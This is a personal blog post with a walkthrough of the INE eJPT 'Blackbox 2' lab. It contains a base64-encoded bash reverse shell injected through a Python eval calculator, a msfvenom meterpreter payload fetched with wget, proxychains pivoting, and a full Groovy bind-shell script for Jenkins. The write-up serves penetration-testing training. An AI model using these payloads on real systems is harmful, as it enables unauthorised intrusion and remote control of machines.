<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="[eJPT] INE Blackbox 2" /><meta name="author" content="Tri Nguyen" /><meta property="og:locale" content="en_US" /><meta name="description" content="INE Blackbox 2 Enumeration 1: Target: online-calc.com Running nmap -sS -Pn -v online-calc.com: 1 2 3 80/tcp open http 5000/tcp open upnp 8000/tcp open http-alt If you go to online-calc.com, online-calc.com:5000 and online-calc.com:8000 you will know that all of these are http web servers. We use dirb scan on all of these host, the only one that return a suspicious answer is: dirb online-calc.com:8000 which return: 1 2 3 ---- Scanning URL: http://online-calc.com:8000/ ---- + http://online-calc.com:8000/.git/HEAD (CODE:200|SIZE:23) + http://online-calc.com:8000/console (CODE:200|SIZE:1985) The console page is locked by a PIN which shows on the shell run by the server. Run dirb on http://online-calc.com:8000/.git =&gt; We know that HEAD and config file are exposed Download /.git/config file we sees something interesting: 1 2 3 [remote &quot;origin&quot;] url = http://online-calc.com/projects/online-calc fetch = +refs/heads/*:refs/remotes/origin/* Clone the following URL to our machine. If we read the API.py file, make sure the isValid function always return True. Then commit the new file by doing: 1 2 3 4 5 git add . git commit -m &quot;Exploit&quot; --author &quot;Jeremy McCarthy &lt;jeremy@dummycorp.com&gt;&quot; git push username: jeremy password: diamonds We know the password in the config file. Now we need to craft a payload for reverse shell https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval 1 2 root@INE:~/online-calc# echo &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.231.2/4444 0&gt;&amp;1&quot;&#39; | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK Then use the following payload in the calculator at port 5000 1 2 __import__(&quot;os&quot;).system(&quot;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK | base64 -d | bash&quot;) No flag in /root lol We need to find the flag using: find / -iname *flag* 2&gt;/dev/null 1 2 cat /tmp/flag 3b2b474c06380f696b38c1498f795e054374 Enumeration 2 We still need a reverse meterpreter shell. Using msfvenom on our machine msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.231.2 LPORT=5555 -f elf &gt; shell.elf Start a simple python http server on our machine, then using the online-calc machine, we retrieve that file using wget On our machine, in metasploit, we start a use exploit/multi/handler on port 5555, IP 192.168.231.2 . We set our payload being linux/x86/meterpreter/reverse_tcp Once we received a Meterpreter shell, run ipconfig. 1 2 3 4 5 6 Name : eth1 Hardware MAC : 02:42:c0:bf:5c:02 MTU : 1500 Flags : UP,BROADCAST,MULTICAST IPv4 Address : 192.191.92.2 IPv4 Netmask : 255.255.255.0 So our second target is within 192.191.92.0/24 range. But first we need to autoroute it to our metasploit session. meterpreter &gt; run autoroute -s 192.191.92.0 Now we need proxy chain to further scan our second target: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/ We use the module auxiliary/server/socks_proxy set the version to 4a, port to 9050 (because proxychains default port is 9050) –&gt; Run the module In another terminal, run proxychains nmap -P0 -sT 192.191.92.3 —&gt; Port 8080 is open Now we need to access the second machine’s 8080 webpage on our machine. In firefox, go to preference then search for proxy, select manual proxy configuration. SOCKS host is 127.0.0.1, port is 9050 and uses socks v4. Tada you can now reach 192.192.92.3:8080 —&gt; A Jenkins webserver. When you go to the Groovy script, we will now create a BIND NETCAT SHELL (not Reverse) and use our machine proxychains to connect to it. The payload is: Source: https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell 1 2 3 4 5 6 7 int port=5555; String cmd=&quot;/bin/sh&quot;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start() Socket s = new java.net.ServerSocket(port).accept() InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); On our attacking machine run: proxychains nc -v 192.191.92.3 5555 We now gain shell access on the target second machine!" /><meta property="og:description" content="INE Blackbox 2 Enumeration 1: Target: online-calc.com Running nmap -sS -Pn -v online-calc.com: 1 2 3 80/tcp open http 5000/tcp open upnp 8000/tcp open http-alt If you go to online-calc.com, online-calc.com:5000 and online-calc.com:8000 you will know that all of these are http web servers. We use dirb scan on all of these host, the only one that return a suspicious answer is: dirb online-calc.com:8000 which return: 1 2 3 ---- Scanning URL: http://online-calc.com:8000/ ---- + http://online-calc.com:8000/.git/HEAD (CODE:200|SIZE:23) + http://online-calc.com:8000/console (CODE:200|SIZE:1985) The console page is locked by a PIN which shows on the shell run by the server. Run dirb on http://online-calc.com:8000/.git =&gt; We know that HEAD and config file are exposed Download /.git/config file we sees something interesting: 1 2 3 [remote &quot;origin&quot;] url = http://online-calc.com/projects/online-calc fetch = +refs/heads/*:refs/remotes/origin/* Clone the following URL to our machine. If we read the API.py file, make sure the isValid function always return True. Then commit the new file by doing: 1 2 3 4 5 git add . git commit -m &quot;Exploit&quot; --author &quot;Jeremy McCarthy &lt;jeremy@dummycorp.com&gt;&quot; git push username: jeremy password: diamonds We know the password in the config file. Now we need to craft a payload for reverse shell https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval 1 2 root@INE:~/online-calc# echo &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.231.2/4444 0&gt;&amp;1&quot;&#39; | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK Then use the following payload in the calculator at port 5000 1 2 __import__(&quot;os&quot;).system(&quot;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK | base64 -d | bash&quot;) No flag in /root lol We need to find the flag using: find / -iname *flag* 2&gt;/dev/null 1 2 cat /tmp/flag 3b2b474c06380f696b38c1498f795e054374 Enumeration 2 We still need a reverse meterpreter shell. Using msfvenom on our machine msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.231.2 LPORT=5555 -f elf &gt; shell.elf Start a simple python http server on our machine, then using the online-calc machine, we retrieve that file using wget On our machine, in metasploit, we start a use exploit/multi/handler on port 5555, IP 192.168.231.2 . We set our payload being linux/x86/meterpreter/reverse_tcp Once we received a Meterpreter shell, run ipconfig. 1 2 3 4 5 6 Name : eth1 Hardware MAC : 02:42:c0:bf:5c:02 MTU : 1500 Flags : UP,BROADCAST,MULTICAST IPv4 Address : 192.191.92.2 IPv4 Netmask : 255.255.255.0 So our second target is within 192.191.92.0/24 range. But first we need to autoroute it to our metasploit session. meterpreter &gt; run autoroute -s 192.191.92.0 Now we need proxy chain to further scan our second target: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/ We use the module auxiliary/server/socks_proxy set the version to 4a, port to 9050 (because proxychains default port is 9050) –&gt; Run the module In another terminal, run proxychains nmap -P0 -sT 192.191.92.3 —&gt; Port 8080 is open Now we need to access the second machine’s 8080 webpage on our machine. In firefox, go to preference then search for proxy, select manual proxy configuration. SOCKS host is 127.0.0.1, port is 9050 and uses socks v4. Tada you can now reach 192.192.92.3:8080 —&gt; A Jenkins webserver. When you go to the Groovy script, we will now create a BIND NETCAT SHELL (not Reverse) and use our machine proxychains to connect to it. The payload is: Source: https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell 1 2 3 4 5 6 7 int port=5555; String cmd=&quot;/bin/sh&quot;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start() Socket s = new java.net.ServerSocket(port).accept() InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); On our attacking machine run: proxychains nc -v 192.191.92.3 5555 We now gain shell access on the target second machine!" /><link rel="canonical" href="/posts/INE-Blackbox-2/" /><meta property="og:url" content="/posts/INE-Blackbox-2/" /><meta property="og:site_name" content="Tri Nguyen" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-11T18:30:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="[eJPT] INE Blackbox 2" /><meta name="twitter:site" content="@letri6tdn" /><meta name="twitter:creator" content="@Tri Nguyen" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Tri Nguyen"},"dateModified":"2022-01-11T18:30:00-07:00","datePublished":"2022-01-11T18:30:00-07:00","description":"INE Blackbox 2 Enumeration 1: Target: online-calc.com Running nmap -sS -Pn -v online-calc.com: 1 2 3 80/tcp open http 5000/tcp open upnp 8000/tcp open http-alt If you go to online-calc.com, online-calc.com:5000 and online-calc.com:8000 you will know that all of these are http web servers. We use dirb scan on all of these host, the only one that return a suspicious answer is: dirb online-calc.com:8000 which return: 1 2 3 ---- Scanning URL: http://online-calc.com:8000/ ---- + http://online-calc.com:8000/.git/HEAD (CODE:200|SIZE:23) + http://online-calc.com:8000/console (CODE:200|SIZE:1985) The console page is locked by a PIN which shows on the shell run by the server. Run dirb on http://online-calc.com:8000/.git =&gt; We know that HEAD and config file are exposed Download /.git/config file we sees something interesting: 1 2 3 [remote &quot;origin&quot;] url = http://online-calc.com/projects/online-calc fetch = +refs/heads/*:refs/remotes/origin/* Clone the following URL to our machine. If we read the API.py file, make sure the isValid function always return True. Then commit the new file by doing: 1 2 3 4 5 git add . git commit -m &quot;Exploit&quot; --author &quot;Jeremy McCarthy &lt;jeremy@dummycorp.com&gt;&quot; git push username: jeremy password: diamonds We know the password in the config file. Now we need to craft a payload for reverse shell https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval 1 2 root@INE:~/online-calc# echo &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.231.2/4444 0&gt;&amp;1&quot;&#39; | base64 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK Then use the following payload in the calculator at port 5000 1 2 __import__(&quot;os&quot;).system(&quot;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK | base64 -d | bash&quot;) No flag in /root lol We need to find the flag using: find / -iname *flag* 2&gt;/dev/null 1 2 cat /tmp/flag 3b2b474c06380f696b38c1498f795e054374 Enumeration 2 We still need a reverse meterpreter shell. Using msfvenom on our machine msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.231.2 LPORT=5555 -f elf &gt; shell.elf Start a simple python http server on our machine, then using the online-calc machine, we retrieve that file using wget On our machine, in metasploit, we start a use exploit/multi/handler on port 5555, IP 192.168.231.2 . We set our payload being linux/x86/meterpreter/reverse_tcp Once we received a Meterpreter shell, run ipconfig. 1 2 3 4 5 6 Name : eth1 Hardware MAC : 02:42:c0:bf:5c:02 MTU : 1500 Flags : UP,BROADCAST,MULTICAST IPv4 Address : 192.191.92.2 IPv4 Netmask : 255.255.255.0 So our second target is within 192.191.92.0/24 range. But first we need to autoroute it to our metasploit session. meterpreter &gt; run autoroute -s 192.191.92.0 Now we need proxy chain to further scan our second target: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/ We use the module auxiliary/server/socks_proxy set the version to 4a, port to 9050 (because proxychains default port is 9050) –&gt; Run the module In another terminal, run proxychains nmap -P0 -sT 192.191.92.3 —&gt; Port 8080 is open Now we need to access the second machine’s 8080 webpage on our machine. In firefox, go to preference then search for proxy, select manual proxy configuration. SOCKS host is 127.0.0.1, port is 9050 and uses socks v4. Tada you can now reach 192.192.92.3:8080 —&gt; A Jenkins webserver. When you go to the Groovy script, we will now create a BIND NETCAT SHELL (not Reverse) and use our machine proxychains to connect to it. The payload is: Source: https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell 1 2 3 4 5 6 7 int port=5555; String cmd=&quot;/bin/sh&quot;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start() Socket s = new java.net.ServerSocket(port).accept() InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); On our attacking machine run: proxychains nc -v 192.191.92.3 5555 We now gain shell access on the target second machine!","headline":"[eJPT] INE Blackbox 2","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/INE-Blackbox-2/"},"url":"/posts/INE-Blackbox-2/"}</script><title>[eJPT] INE Blackbox 2 | Tri Nguyen</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tri Nguyen"><meta name="application-name" content="Tri Nguyen"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://i.imgur.com/Qql7PB7.jpg?1" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tri Nguyen</a></div><div class="site-subtitle font-italic">I sometimes post things.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/infosec/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>INFOSEC</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/rcs-tringuyen" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/letri6tdn" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['tlnguyen','ualberta.ca'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <script src="https://tryhackme.com/badge/252485"></script></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>[eJPT] INE Blackbox 2</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>[eJPT] INE Blackbox 2</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Tri Nguyen </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jan 11, 2022, 6:30 PM -0700" >Jan 11<i class="unloaded">2022-01-11T18:30:00-07:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="554 words">3 min read</span></div></div><div class="post-content"><h1 id="ine-blackbox-2">INE Blackbox 2</h1><h2 id="enumeration-1">Enumeration 1:</h2><ul><li><p>Target: online-calc.com</p><li><p>Running <code class="language-plaintext highlighter-rouge">nmap -sS -Pn -v online-calc.com</code>:</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>80/tcp   open  http
5000/tcp open  upnp
8000/tcp open  http-alt
</pre></table></code></div></div><ul><li><p>If you go to online-calc.com, online-calc.com:5000 and online-calc.com:8000 you will know that all of these are http web servers.</p><li><p>We use dirb scan on all of these host, the only one that return a suspicious answer is: <code class="language-plaintext highlighter-rouge">dirb online-calc.com:8000</code> which return:</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>---- Scanning URL: http://online-calc.com:8000/ ----
+ http://online-calc.com:8000/.git/HEAD (CODE:200|SIZE:23)                     
+ http://online-calc.com:8000/console (CODE:200|SIZE:1985)
</pre></table></code></div></div><ul><li><p>The console page is locked by a PIN which shows on the shell run by the server.</p><li><p>Run dirb on http://online-calc.com:8000/.git =&gt; We know that HEAD and config file are exposed</p><li><p>Download <code class="language-plaintext highlighter-rouge">/.git/config</code> file we sees something interesting:</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[remote "origin"]
	url = http://online-calc.com/projects/online-calc
	fetch = +refs/heads/*:refs/remotes/origin/*
</pre></table></code></div></div><ul><li><p>Clone the following URL to our machine.</p><li><p>If we read the API.py file, make sure the isValid function always return True.</p><li><p>Then commit the new file by doing:</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>git add .
git commit -m "Exploit" --author "Jeremy McCarthy &lt;jeremy@dummycorp.com&gt;"
git push 
username: jeremy
password: diamonds
</pre></table></code></div></div><ul><li><p>We know the password in the config file.</p><li><p>Now we need to craft a payload for reverse shell https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@INE:~/online-calc# echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.231.2/4444 0&gt;&amp;1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK
</pre></table></code></div></div><ul><li>Then use the following payload in the calculator at port 5000</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMS4yLzQ0NDQgMD4mMSIK | base64 -d | bash")

</pre></table></code></div></div><ul><li><p>No flag in /root lol</p><li><p>We need to find the flag using: <code class="language-plaintext highlighter-rouge">find / -iname *flag* 2&gt;/dev/null</code></p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cat /tmp/flag
3b2b474c06380f696b38c1498f795e054374
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration 2</h1><ul><li>We still need a reverse meterpreter shell. Using msfvenom on our machine</ul><p><code class="language-plaintext highlighter-rouge">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.231.2 LPORT=5555 -f elf &gt; shell.elf</code></p><ul><li><p>Start a simple python http server on our machine, then using the online-calc machine, we retrieve that file using wget</p><li><p>On our machine, in metasploit, we start a <code class="language-plaintext highlighter-rouge">use exploit/multi/handler</code> on port 5555, IP 192.168.231.2 . We set our payload being <code class="language-plaintext highlighter-rouge">linux/x86/meterpreter/reverse_tcp</code></p><li><p>Once we received a Meterpreter shell, run <code class="language-plaintext highlighter-rouge">ipconfig</code>.</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Name         : eth1
Hardware MAC : 02:42:c0:bf:5c:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.191.92.2
IPv4 Netmask : 255.255.255.0
</pre></table></code></div></div><ul><li><p>So our second target is within 192.191.92.0/24 range. But first we need to autoroute it to our metasploit session. <code class="language-plaintext highlighter-rouge">meterpreter &gt; run autoroute -s 192.191.92.0</code></p><li><p>Now we need proxy chain to further scan our second target: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/</p></ul><p><img data-proofer-ignore data-src="https://miro.medium.com/max/700/1*exRPwGYJpGv6eESldShwzQ.png" alt="Alt text" /></p><ul><li><p>We use the module <code class="language-plaintext highlighter-rouge">auxiliary/server/socks_proxy</code> set the version to 4a, port to 9050 (because proxychains default port is 9050) –&gt; Run the module</p><li><p>In another terminal, run <code class="language-plaintext highlighter-rouge">proxychains nmap -P0 -sT 192.191.92.3</code> —&gt; Port 8080 is open</p><li><p>Now we need to access the second machine’s 8080 webpage on our machine. In firefox, go to preference then search for proxy, select manual proxy configuration. SOCKS host is 127.0.0.1, port is 9050 and uses socks v4.</p><li><p>Tada you can now reach 192.192.92.3:8080 —&gt; A Jenkins webserver.</p><li><p>When you go to the Groovy script, we will now create a BIND NETCAT SHELL (not Reverse) and use our machine proxychains to connect to it. The payload is:</p><li><p>Source: https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>int port=5555;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</pre></table></code></div></div><ul><li><p>On our attacking machine run: <code class="language-plaintext highlighter-rouge">proxychains nc -v 192.191.92.3 5555</code></p><li><p>We now gain shell access on the target second machine!</p></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/write-up/'>Write Up</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/write-up/" class="post-tag no-text-decoration" >write-up</a> <a href="/tags/ine/" class="post-tag no-text-decoration" >ine</a> <a href="/tags/ejpt/" class="post-tag no-text-decoration" >ejpt</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=[eJPT] INE Blackbox 2 - Tri Nguyen&url=/posts/INE-Blackbox-2/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=[eJPT] INE Blackbox 2 - Tri Nguyen&u=/posts/INE-Blackbox-2/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=[eJPT] INE Blackbox 2 - Tri Nguyen&url=/posts/INE-Blackbox-2/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hydra-Cheatsheet/">[Knowledge] Hydra Cheatsheet</a><li><a href="/posts/TryHackMe-Road/">[TryHackMe] Road</a><li><a href="/posts/EZCTF-2022/">[EZCTF] Report</a><li><a href="/posts/Announcement/">[Announcement] I promise I will upload write-ups!</a><li><a href="/posts/OverTheWire-Leviathan/">[OverTheWire] [Leviathan] Report</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/write-up/">write-up</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a 